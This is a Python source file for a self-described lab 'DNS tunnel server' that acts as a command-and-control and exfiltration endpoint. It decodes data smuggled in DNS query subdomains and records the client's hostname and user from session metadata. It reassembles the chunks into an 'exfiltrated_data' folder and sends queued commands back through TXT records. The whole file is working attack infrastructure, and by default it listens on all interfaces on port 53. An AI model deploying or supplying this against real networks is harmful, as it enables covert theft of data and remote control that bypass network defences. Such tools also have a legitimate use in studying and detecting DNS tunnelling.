#!/usr/bin/env python3
"""
DNS Tunneling Lab - Server Component
=====================================
Simulates a C2/exfiltration server that receives data via DNS queries.
For use in isolated lab environments only.

Architecture:
  Client → DNS Query (data encoded in subdomain) → This Server
  Server → DNS Response (data encoded in TXT/A records) → Client

Usage:
  sudo python3 dns_tunnel_server.py --domain lab.local --interface lo --port 5353
"""

import argparse
import base64
import binascii
import hashlib
import json
import logging
import os
import re
import socket
import struct
import sys
import threading
import time
from collections import defaultdict
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
LOG_FILE = "dns_tunnel_server.log"
EXFIL_DIR = "exfiltrated_data"
SESSION_TIMEOUT = 300  # seconds

# ---------------------------------------------------------------------------
# Logging Setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("dns_tunnel_server")

# ---------------------------------------------------------------------------
# DNS Protocol Helpers
# ---------------------------------------------------------------------------
DNS_TYPE_A     = 1
DNS_TYPE_TXT   = 16
DNS_TYPE_CNAME = 5
DNS_CLASS_IN   = 1


def parse_dns_name(data: bytes, offset: int) -> tuple[str, int]:
    """Parse a DNS name from wire format. Returns (name, new_offset)."""
    labels = []
    visited = set()
    while True:
        if offset in visited:
            raise ValueError("DNS name compression loop detected")
        visited.add(offset)
        length = data[offset]
        if length == 0:
            offset += 1
            break
        elif (length & 0xC0) == 0xC0:          # compression pointer
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            name_suffix, _ = parse_dns_name(data, ptr)
            labels.append(name_suffix)
            offset += 2
            break
        else:
            offset += 1
            labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
            offset += length
    return ".".join(labels), offset


def build_dns_response_header(txid: int, flags: int, qdcount: int,
                               ancount: int, nscount: int, arcount: int) -> bytes:
    return struct.pack("!HHHHHH", txid, flags, qdcount, ancount, nscount, arcount)


def encode_dns_name(name: str) -> bytes:
    """Encode a domain name to DNS wire format."""
    buf = b""
    for label in name.rstrip(".").split("."):
        enc = label.encode("ascii")
        buf += bytes([len(enc)]) + enc
    buf += b"\x00"
    return buf


def build_txt_record(name: str, txt_data: str, ttl: int = 0) -> bytes:
    """Build a DNS TXT resource record."""
    rdata = txt_data.encode("ascii")
    rdata_wire = bytes([len(rdata)]) + rdata
    return (
        encode_dns_name(name)
        + struct.pack("!HHIH", DNS_TYPE_TXT, DNS_CLASS_IN, ttl, len(rdata_wire))
        + rdata_wire
    )


def build_a_record(name: str, ip: str, ttl: int = 0) -> bytes:
    """Build a DNS A resource record."""
    rdata = socket.inet_aton(ip)
    return (
        encode_dns_name(name)
        + struct.pack("!HHIH", DNS_TYPE_A, DNS_CLASS_IN, ttl, 4)
        + rdata
    )


# ---------------------------------------------------------------------------
# Session / Reassembly
# ---------------------------------------------------------------------------
class TunnelSession:
    """Tracks a single DNS tunnel session (client ↔ server exchange)."""

    def __init__(self, session_id: str, client_addr: tuple):
        self.session_id = session_id
        self.client_addr = client_addr
        self.chunks: dict[int, bytes] = {}
        self.total_chunks: int | None = None
        self.start_time = time.time()
        self.last_activity = time.time()
        self.metadata: dict = {}
        self.response_queue: list[str] = []   # server→client responses
        self.response_idx: int = 0

    def add_chunk(self, seq: int, data: bytes, total: int | None = None):
        self.chunks[seq] = data
        if total is not None:
            self.total_chunks = total
        self.last_activity = time.time()

    def is_complete(self) -> bool:
        if self.total_chunks is None:
            return False
        return len(self.chunks) >= self.total_chunks

    def reassemble(self) -> bytes:
        return b"".join(self.chunks[i] for i in sorted(self.chunks))

    def queue_response(self, data: str):
        """Chunk a server response into ≤40-char DNS-safe pieces."""
        chunk_size = 40
        for i in range(0, len(data), chunk_size):
            self.response_queue.append(data[i:i + chunk_size])

    def next_response_chunk(self) -> str | None:
        if self.response_idx < len(self.response_queue):
            chunk = self.response_queue[self.response_idx]
            self.response_idx += 1
            return chunk
        return None


# ---------------------------------------------------------------------------
# Tunnel Decoder  (mirrors encoding in client)
# ---------------------------------------------------------------------------
def decode_label_data(encoded: str) -> bytes:
    """Decode hex-encoded data from DNS labels.

    The selector path splits hex data across multiple labels separated by
    dots (e.g. 'aabb.ccdd.eeff').  Strip dots before decoding so
    bytes.fromhex() receives a clean hex string.
    """
    # Remove dot separators inserted between labels
    clean = encoded.replace(".", "")
    try:
        return bytes.fromhex(clean)
    except ValueError:
        pass
    try:
        # Pad base32 if needed
        padding = (8 - len(clean) % 8) % 8
        return base64.b32decode(clean.upper() + "=" * padding)
    except Exception:
        pass
    return encoded.encode()


# ---------------------------------------------------------------------------
# DNS Packet Parser & Dispatcher
# ---------------------------------------------------------------------------
class DNSTunnelServer:
    def __init__(self, domain: str, listen_ip: str, port: int,
                 verbose: bool = False):
        self.domain = domain.lower().rstrip(".")
        self.listen_ip = listen_ip
        self.port = port
        self.verbose = verbose
        self.sessions: dict[str, TunnelSession] = {}
        self.lock = threading.Lock()
        self.stats = defaultdict(int)
        os.makedirs(EXFIL_DIR, exist_ok=True)

    # ------------------------------------------------------------------
    # Main server loop
    # ------------------------------------------------------------------
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.listen_ip, self.port))
        log.info(f"DNS Tunnel Server listening on {self.listen_ip}:{self.port}")
        log.info(f"Tunnel domain: {self.domain}")
        log.info(f"Exfiltrated data → {EXFIL_DIR}/")

        # Cleanup thread
        threading.Thread(target=self._cleanup_loop, daemon=True).start()

        while True:
            try:
                data, addr = sock.recvfrom(512)
                threading.Thread(
                    target=self._handle_packet,
                    args=(sock, data, addr),
                    daemon=True,
                ).start()
            except KeyboardInterrupt:
                log.info("Shutting down.")
                break
            except Exception as e:
                log.error(f"Receive error: {e}")

    # ------------------------------------------------------------------
    # Packet handler
    # ------------------------------------------------------------------
    def _handle_packet(self, sock, raw: bytes, addr: tuple):
        try:
            if len(raw) < 12:
                return
            txid, flags, qdcount = struct.unpack("!HHH", raw[:6])
            offset = 12
            questions = []
            for _ in range(qdcount):
                qname, offset = parse_dns_name(raw, offset)
                qtype, qclass = struct.unpack("!HH", raw[offset:offset + 4])
                offset += 4
                questions.append((qname.lower(), qtype, qclass))

            for qname, qtype, qclass in questions:
                self.stats["queries"] += 1
                response = self._process_query(txid, flags, qname, qtype,
                                               qclass, addr)
                if response:
                    sock.sendto(response, addr)
        except Exception as e:
            log.error(f"Packet handling error from {addr}: {e}", exc_info=self.verbose)

    # ------------------------------------------------------------------
    # Query processor – decode tunnel protocol
    # ------------------------------------------------------------------
    def _process_query(self, txid: int, req_flags: int, qname: str,
                       qtype: int, qclass: int, addr: tuple) -> bytes | None:
        """
        Tunnel query format:
          <type>.<session>.<seq>.<total>.<data_hex>.<domain>

        Types:
          INIT  – session init, data = hex-encoded JSON metadata
          DATA  – data chunk
          FIN   – final chunk indicator
          POLL  – client polling for response from server
        """
        if not qname.endswith(self.domain):
            return None   # Not our domain

        subdomain = qname[: -(len(self.domain) + 1)]   # strip ".domain"
        parts = subdomain.split(".")

        if len(parts) < 4:
            return self._nxdomain(txid, qname, qtype)

        msg_type  = parts[0].upper()
        session_id = parts[1]
        seq        = int(parts[2]) if parts[2].isdigit() else 0
        total      = int(parts[3]) if parts[3].isdigit() else None
        data_hex   = ".".join(parts[4:]) if len(parts) > 4 else ""

        log.debug(f"[{addr[0]}] type={msg_type} sess={session_id} "
                  f"seq={seq}/{total} data_len={len(data_hex)}")

        with self.lock:
            if msg_type == "INIT":
                return self._handle_init(txid, qname, qtype, session_id, addr, data_hex)
            elif msg_type in ("DATA", "FIN"):
                return self._handle_data(txid, qname, qtype, session_id, seq,
                                         total, data_hex, finalize=(msg_type == "FIN"))
            elif msg_type == "POLL":
                return self._handle_poll(txid, qname, qtype, session_id)
            else:
                log.warning(f"Unknown message type: {msg_type}")
                return self._nxdomain(txid, qname, qtype)

    # ------------------------------------------------------------------
    def _handle_init(self, txid, qname, qtype, session_id, addr, data_hex):
        raw = decode_label_data(data_hex)
        try:
            meta = json.loads(raw.decode())
        except Exception:
            meta = {"raw": data_hex}

        session = TunnelSession(session_id, addr)
        session.metadata = meta
        self.sessions[session_id] = session
        self.stats["sessions"] += 1

        log.info(f"[NEW SESSION] id={session_id} client={addr[0]} "
                 f"hostname={meta.get('hostname','?')} user={meta.get('user','?')}")

        # Response: ACK with server timestamp
        ack = f"ACK:{session_id}:{int(time.time())}"
        return self._txt_response(txid, qname, ack)

    def _handle_data(self, txid, qname, qtype, session_id, seq, total,
                     data_hex, finalize: bool):
        session = self.sessions.get(session_id)
        if session is None:
            log.warning(f"Data for unknown session {session_id}")
            return self._txt_response(txid, qname, "ERR:NOSESSION")

        chunk = decode_label_data(data_hex)
        session.add_chunk(seq, chunk, total)
        self.stats["chunks"] += 1

        if finalize or session.is_complete():
            self._save_session(session)
            return self._txt_response(txid, qname, f"OK:FIN:{session_id}")

        return self._txt_response(txid, qname, f"OK:{seq}")

    def _handle_poll(self, txid, qname, qtype, session_id):
        session = self.sessions.get(session_id)
        if session is None:
            return self._txt_response(txid, qname, "NULL")
        chunk = session.next_response_chunk()
        if chunk:
            return self._txt_response(txid, qname, f"DATA:{chunk}")
        return self._txt_response(txid, qname, "NULL")

    # ------------------------------------------------------------------
    # Persist reassembled data
    # ------------------------------------------------------------------
    def _save_session(self, session: TunnelSession):
        raw = session.reassemble()
        session_dir = os.path.join(EXFIL_DIR, session.session_id)
        os.makedirs(session_dir, exist_ok=True)

        # Raw bytes
        with open(os.path.join(session_dir, "raw.bin"), "wb") as f:
            f.write(raw)

        # Attempt UTF-8 decode
        try:
            text = raw.decode("utf-8")
            with open(os.path.join(session_dir, "data.txt"), "w") as f:
                f.write(text)
        except UnicodeDecodeError:
            text = binascii.hexlify(raw).decode()

        # Metadata / summary
        summary = {
            "session_id": session.session_id,
            "client": f"{session.client_addr[0]}:{session.client_addr[1]}",
            "metadata": session.metadata,
            "chunks": len(session.chunks),
            "bytes": len(raw),
            "sha256": hashlib.sha256(raw).hexdigest(),
            "timestamp": datetime.now(tz=timezone.utc).isoformat(),
        }
        with open(os.path.join(session_dir, "summary.json"), "w") as f:
            json.dump(summary, f, indent=2)

        log.info(f"[EXFIL SAVED] session={session.session_id} "
                 f"bytes={len(raw)} sha256={summary['sha256'][:16]}…")
        log.info(f"  → {session_dir}/")

    # ------------------------------------------------------------------
    # Response builders
    # ------------------------------------------------------------------
    def _txt_response(self, txid: int, qname: str, txt: str) -> bytes:
        """Build a DNS TXT response.

        Uses a compression pointer (0xC00C) in the answer name field so the
        full FQDN is not repeated.  This keeps the UDP datagram well under
        the 512-byte baseline limit even for long tunnel FQDNs.
        """
        flags    = 0x8180   # QR=1 AA=1 RD=1 RA=1
        rdata    = txt.encode("ascii")
        # TXT RDATA wire format: <1-byte length> <string>
        rdata_wire = bytes([len(rdata)]) + rdata

        header   = build_dns_response_header(txid, flags, 1, 1, 0, 0)
        question = encode_dns_name(qname) + struct.pack("!HH", DNS_TYPE_TXT, DNS_CLASS_IN)
        # Answer: compression pointer back to offset 12 (start of QNAME in question)
        answer = (
            b"\xc0\x0c"                                         # name: pointer → offset 12
            + struct.pack("!HHIH", DNS_TYPE_TXT, DNS_CLASS_IN,  # type, class
                          0, len(rdata_wire))                   # ttl=0, rdlength
            + rdata_wire
        )
        return header + question + answer

    def _nxdomain(self, txid: int, qname: str, qtype: int) -> bytes:
        flags = 0x8183   # QR=1 AA=1 RCODE=3 (NXDOMAIN)
        header = build_dns_response_header(txid, flags, 1, 0, 0, 0)
        question = encode_dns_name(qname) + struct.pack("!HH", qtype, DNS_CLASS_IN)
        return header + question

    # ------------------------------------------------------------------
    # Session cleanup
    # ------------------------------------------------------------------
    def _cleanup_loop(self):
        while True:
            time.sleep(60)
            now = time.time()
            with self.lock:
                expired = [sid for sid, s in self.sessions.items()
                           if now - s.last_activity > SESSION_TIMEOUT]
                for sid in expired:
                    log.info(f"Session {sid} expired, cleaning up.")
                    del self.sessions[sid]


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="DNS Tunnel Server – Lab Demonstration Tool"
    )
    parser.add_argument("--domain",    default="tunnel.lab.local",
                        help="Authoritative domain for tunnel (default: tunnel.lab.local)")
    parser.add_argument("--interface", default="0.0.0.0",
                        help="IP to listen on (default: 0.0.0.0)")
    parser.add_argument("--port",      type=int, default=53,
                        help="UDP port (default: 53, requires root)")
    parser.add_argument("--verbose",   action="store_true",
                        help="Enable debug logging")
    args = parser.parse_args()

    if args.verbose:
        log.setLevel(logging.DEBUG)

    if args.port < 1024 and os.geteuid() != 0:
        print("[!] Ports < 1024 require root. Use sudo or --port 5353")
        sys.exit(1)

    server = DNSTunnelServer(args.domain, args.interface, args.port, args.verbose)
    server.run()


if __name__ == "__main__":
    main()
